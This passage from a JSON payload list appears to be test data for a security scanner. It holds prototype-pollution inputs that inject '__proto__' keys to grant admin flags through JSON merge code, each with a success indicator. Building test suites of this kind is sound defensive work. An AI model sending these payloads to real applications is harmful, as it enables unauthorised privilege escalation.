        "context": "JSON/merge",
        "indicator": "obj.constructor === null"
      },
      {
        "payload": "{\"__proto__\": {\"isAdmin\": true}}",
        "description": "Privilege escalation via prototype",
        "context": "JSON/merge",
        "indicator": "{}.isAdmin === true"
      },
      {
        "payload": "{\"__proto__\": {\"constructor\": {\"prototype\": {\"admin\": true}}}}",
        "description": "Deep constructor pollution",
        "context": "JSON/merge",
        "indicator": "admin access"
